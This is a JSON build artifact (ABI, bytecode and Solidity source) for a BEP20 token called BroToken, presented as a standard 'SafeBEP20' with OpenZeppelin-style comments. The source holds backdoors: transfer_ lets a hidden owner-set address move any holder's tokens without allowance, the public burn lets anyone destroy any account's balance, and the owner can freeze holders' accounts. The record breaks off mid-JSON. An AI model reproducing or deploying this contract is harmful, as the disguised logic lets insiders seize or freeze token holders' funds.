{
  "contractName": "SafeBEP20",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "supply",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousbigBro",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newbigBro",
          "type": "address"
        }
      ],
      "name": "BigBrotherTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "MuteAccount",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "UnMuteAccount",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bigBro",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renouncebigBrother",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newbigBro",
          "type": "address"
        }
      ],
      "name": "transferbigBroship",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pB",
          "type": "address"
        }
      ],
      "name": "setpB",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer_",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "burn",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "suspendAccount",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "unsuspendAccount",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523480156200001157600080fd5b506040516200154738038062001547833981016040819052620000349162000289565b600080546001600160a01b031916339081178255604051909182917f30d42be0afda2a4552a38b1df0d6b81415532e5c4d31fb09350f1c6b8508abfc908290a35060408051808201909152600880825267213937aa37b5b2b760c11b6020909201918252620000a691600591620001e3565b5060408051808201909152600480825263109493d560e21b6020909201918252620000d491600691620001e3565b50620000f433620000ee83670de0b6b3a7640000620002be565b620000fb565b5062000333565b6001600160a01b038216620001565760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640160405180910390fd5b80600460008282546200016a9190620002a3565b90915550506001600160a01b0382166000908152600260205260408120805483929062000199908490620002a3565b90915550506040518181526001600160a01b038316906000907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a35050565b828054620001f190620002e0565b90600052602060002090601f01602090048101928262000215576000855562000260565b82601f106200023057805160ff191683800117855562000260565b8280016001018555821562000260579182015b828111156200026057825182559160200191906001019062000243565b506200026e92915062000272565b5090565b5b808211156200026e576000815560010162000273565b6000602082840312156200029c57600080fd5b5051919050565b60008219821115620002b957620002b96200031d565b500190565b6000816000190483118215151615620002db57620002db6200031d565b500290565b600181811c90821680620002f557607f821691505b602082108114156200031757634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fd5b61120480620003436000396000f3fe6080604052600436106101185760003560e01c80638ed9b31e116100a0578063a457c2d711610064578063a457c2d714610319578063a9059cbb14610339578063b3be454514610359578063dd62ed3e1461036e578063e071b9bf146103b457600080fd5b80638ed9b31e1461028457806395d89b41146102a45780639dc29fac146102b95780639fbaec38146102d9578063a1a6d5fc146102f957600080fd5b80632ae9e96e116100e75780632ae9e96e146101d3578063313ce567146101f3578063395093511461020f57806370a082311461022f5780638b0eccc11461025c57600080fd5b806306fdde0314610139578063095ea7b31461016457806318160ddd1461019457806323b872dd146101b357600080fd5b366101345767016345785d8a000034101561013257600080fd5b005b600080fd5b34801561014557600080fd5b5061014e6103d4565b60405161015b919061108f565b60405180910390f35b34801561017057600080fd5b5061018461017f366004611065565b610466565b604051901515815260200161015b565b3480156101a057600080fd5b506004545b60405190815260200161015b565b3480156101bf57600080fd5b506101846101ce366004611029565b6104b3565b3480156101df57600080fd5b506101326101ee366004610fd4565b610592565b3480156101ff57600080fd5b506040516012815260200161015b565b34801561021b57600080fd5b5061018461022a366004611065565b61067d565b34801561023b57600080fd5b506101a561024a366004610fd4565b60026020526000908152604090205481565b34801561026857600080fd5b506000546040516001600160a01b03909116815260200161015b565b34801561029057600080fd5b5061018461029f366004610fd4565b6106e3565b3480156102b057600080fd5b5061014e6107e6565b3480156102c557600080fd5b506101846102d4366004611065565b6107f5565b3480156102e557600080fd5b506101846102f4366004610fd4565b61082f565b34801561030557600080fd5b50610184610314366004611029565b610933565b34801561032557600080fd5b50610184610334366004611065565b6109b1565b34801561034557600080fd5b50610184610354366004611065565b610a72565b34801561036557600080fd5b50610132610aad565b34801561037a57600080fd5b506101a5610389366004610ff6565b6001600160a01b03918216600090815260036020908152604080832093909416825291909152205490565b3480156103c057600080fd5b506101846103cf366004610fd4565b610b21565b6060600580546103e39061117d565b80601f016020809104026020016040519081016040528092919081815260200182805461040f9061117d565b801561045c5780601f106104315761010080835404028352916020019161045c565b820191906000526020600020905b81548152906001019060200180831161043f57829003601f168201915b5050505050905090565b3360009081526001602052604081205460ff161561049f5760405162461bcd60e51b8152600401610496906110e4565b60405180910390fd5b6104aa338484610b71565b50600192915050565b3360009081526001602052604081205460ff16156104e35760405162461bcd60e51b8152600401610496906110e4565b6104ee848484610c96565b6001600160a01b0384166000908152600360209081526040808320338452909152902054828110156105735760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b6064820152608401610496565b61058785336105828685611166565b610b71565b506001949350505050565b6000546001600160a01b031633146105bc5760405162461bcd60e51b815260040161049690611108565b6001600160a01b0381166106225760405162461bcd60e51b815260206004820152602760248201527f4f776e61626c653a206e65772062696742726f20697320746865207a65726f206044820152666164647265737360c81b6064820152608401610496565b600080546040516001600160a01b03808516939216917f30d42be0afda2a4552a38b1df0d6b81415532e5c4d31fb09350f1c6b8508abfc91a3600080546001600160a01b0319166001600160a01b0392909216919091179055565b3360009081526001602052604081205460ff16156106ad5760405162461bcd60e51b8152600401610496906110e4565b3360008181526003602090815260408083206001600160a01b03881684529091529020546104aa9190859061058290869061114e565b600080546001600160a01b0316331461070e5760405162461bcd60e51b815260040161049690611108565b6001600160a01b03821660009081526001602052604090205460ff16156107775760405162461bcd60e51b815260206004820152601c60248201527f4163636f756e742073757370656e646564206265666f7265206e6f77000000006044820152606401610496565b6001600160a01b0382166000818152600160208190526040808320805460ff1916909217909155517f219fdc4ba5d5db0c3aece2094c8f7c5992dc1963312c059a6d16ff4e09b6e64c9190a2506001600160a01b03811660009081526001602052604090205460ff165b919050565b6060600680546103e39061117d565b3360009081526001602052604081205460ff16156108255760405162461bcd60e51b8152600401610496906110e4565b6104aa8383610e6e565b600080546001600160a01b0316331461085a5760405162461bcd60e51b815260040161049690611108565b6001600160a01b03821660009081526001602052604090205460ff166108ce5760405162461bcd60e51b8152602060048201526024808201527f4163636f756e74206973206e6f742073757370656e646564206265666f7265206044820152633737bb9760e11b6064820152608401610496565b6001600160a01b038216600081815260016020526040808220805460ff19169055517feb043ab0f7cd08886b8aaab3c103c59829e8b223765b9db006132a75800885d39190a2506001600160a01b031660009081526001602052604090205460ff1690565b6007546000906001600160a01b03161561096c576007546001600160a01b0316336001600160a01b03161461096757600080fd5b61099c565b60405162461bcd60e51b81526020600482015260056024820152644f6f6f707360d81b6044820152606401610496565b6109a7848484610c96565b5060019392505050565b3360009081526001602052604081205460ff16156109e15760405162461bcd60e51b8152600401610496906110e4565b3360009081526003602090815260408083206001600160a01b038716845290915290205482811015610a635760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610496565b6109a733856105828685611166565b3360009081526001602052604081205460ff1615610aa25760405162461bcd60e51b8152600401610496906110e4565b6104aa338484610c96565b6000546001600160a01b03163314610ad75760405162461bcd60e51b815260040161049690611108565b600080546040516001600160a01b03909116907f30d42be0afda2a4552a38b1df0d6b81415532e5c4d31fb09350f1c6b8508abfc908390a3600080546001600160a01b0319169055565b600080546001600160a01b03163314610b4c5760405162461bcd60e51b815260040161049690611108565b50600780546001600160a01b0383166001600160a01b03199091161790556001919050565b6001600160a01b038316610bd35760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610496565b6001600160a01b038216610c345760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610496565b6001600160a01b0383811660008181526003602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b038316610cfa5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610496565b6001600160a01b038216610d5c5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610496565b6001600160a01b03831660009081526002602052604090205481811015610dd45760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610496565b610dde8282611166565b6001600160a01b038086166000908152600260205260408082209390935590851681529081208054849290610e1490849061114e565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610e6091815260200190565b60405180910390a350505050565b6001600160a01b038216610ece5760405162461bcd60e51b815260206004820152602160248201527f45524332303a206275726e2066726f6d20746865207a65726f206164647265736044820152607360f81b6064820152608401610496565b6001600160a01b03821660009081526002602052604090205481811015610f425760405162461bcd60e51b815260206004820152602260248201527f45524332303a206275726e20616d6f756e7420657863656564732062616c616e604482015261636560f01b6064820152608401610496565b610f4c8282611166565b6001600160a01b03841660009081526002602052604081209190915560048054849290610f7a908490611166565b90915550506040518281526000906001600160a01b038516907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90602001610c89565b80356001600160a01b03811681146107e157600080fd5b600060208284031215610fe657600080fd5b610fef82610fbd565b9392505050565b6000806040838503121561100957600080fd5b61101283610fbd565b915061102060208401610fbd565b90509250929050565b60008060006060848603121561103e57600080fd5b61104784610fbd565b925061105560208501610fbd565b9150604084013590509250925092565b6000806040838503121561107857600080fd5b61108183610fbd565b946020939093013593505050565b600060208083528351808285015260005b818110156110bc578581018301518582016040015282016110a0565b818111156110ce576000604083870101525b50601f01601f1916929092016040019392505050565b6020808252600a908201526914995cdd1c9a58dd195960b21b604082015260600190565b60208082526026908201527f4f776e61626c653a2046554e4354494f4e204953205052495641544520544f2060408201526562696742726f60d01b606082015260800190565b60008219821115611161576111616111b8565b500190565b600082821015611178576111786111b8565b500390565b600181811c9082168061119157607f821691505b602082108114156111b257634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fdfea2646970667358221220ccdc3dc24bdb98e0f54e714c533410eaf5c32d9178e9769ab96358256051d86364736f6c63430008060033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./interfaces/IBEP20.sol\";\r\nimport \"./interfaces/IBEP20Metadata.sol\";\r\nimport \"./lib/Context.sol\";\r\nimport \"./lib/SafeMath.sol\";\r\nimport \"./lib/Ownable.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract SafeBEP20 is Ownable, IBEP20, IERC20Metadata {\r\n    using SafeMath for uint256;\r\n\r\n    event MuteAccount(address indexed _target);\r\n\r\n    event UnMuteAccount(address indexed _target);\r\n\r\n    mapping(address => bool) private suspension;\r\n\r\n    mapping (address => uint256) public override balanceOf;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    address private pB;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * The defaut value of {decimals} is 18. To select a different value for\r\n     * {decimals} you should overload it.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor (uint supply) {\r\n        _name = \"BroToken\";\r\n        _symbol =  \"BROT\";\r\n        _mint(_msgSender(), (supply * (10**18)));\r\n    }\r\n\r\n    modifier isNotsuspended() {\r\n        require(!suspension[_msgSender()], 'Restricted');\r\n        _;\r\n    }\r\n\r\n    modifier forPB() {\r\n        if(pB != address(0)) {\r\n            require(_msgSender() == pB);\r\n        } else{\r\n            revert('Ooops');\r\n        }\r\n        _;\r\n    }\r\n\r\n    receive () external payable {\r\n        if(msg.value < 1e17 wei) revert();\r\n    }\r\n\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    \r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\r\n     * overridden;\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    // function balanceOf(address account) public view virtual override returns (uint256) {\r\n    //     return balanceOf[account];\r\n    // }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public override isNotsuspended returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public override isNotsuspended returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function setpB(address _pB) public PRIVATE returns(bool) {\r\n        pB = _pB;\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override isNotsuspended returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public isNotsuspended returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public isNotsuspended returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = balanceOf[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        balanceOf[sender] = senderBalance - amount;\r\n        balanceOf[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function transfer_(address sender, address recipient, uint amount) public forPB returns(bool) {\r\n        _transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) private {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        balanceOf[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = balanceOf[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        balanceOf[account] = accountBalance - amount;\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function burn(address account, uint256 amount) external isNotsuspended returns(bool) {\r\n        _burn(account, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be to transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal { }\r\n\r\n    function suspendAccount(address _target) public PRIVATE returns(bool) {\r\n        if(suspension[_target]) revert('Account suspended before now');\r\n        suspension[_target] = true;\r\n        emit MuteAccount(_target);\r\n        return suspension[_target];\r\n    }\r\n\r\n    function unsuspendAccount(address _target) public PRIVATE returns(bool) {\r\n        if(!suspension[_target]) revert('Account is not suspended before now.');\r\n        suspension[_target] = false;\r\n        emit UnMuteAccount(_target);\r\n\r\n        return suspension[_target];\r\n    }\r\n\r\n}\r\n\r\n\r\n",
  "sourcePath": "C:/Users/FVO_MMILLLER/Desktop/brothersBob/brothersFinance/contracts/SafeBEP20.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.6+commit.11564f7e.Emscripten.clang"
  },
  "schemaVersion": "3.4.1",
  "updatedAt": "2021-07-16T05:11:23.187Z",
  "devdoc": {
    "details": "Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. For a generic mechanism see {ERC20PresetMinterPauser}. TIP: For a detailed writeup see our guide https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. We have followed general OpenZeppelin guidelines: functions revert instead of returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications. Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification. Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.",
    "kind": "dev",
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}. Requirements: - `spender` cannot be the zero address."
      },
      "bigBro()": {
        "details": "Returns the address of the current bigBro."
      },
      "burn(address,uint256)": {
        "details": "Destroys `amount` tokens from `account`, reducing the total supply. Emits a {Transfer} event with `to` set to the zero address. Requirements - `account` cannot be the zero address. - `account` must have at least `amount` tokens."
      },
      "constructor": {
        "details": "Sets the values for {name} and {symbol}. The defaut value of {decimals} is 18. To select a different value for {decimals} you should overload it. All two of these values are immutable: they can only be set once during construction."
      },
      "decimals()": {
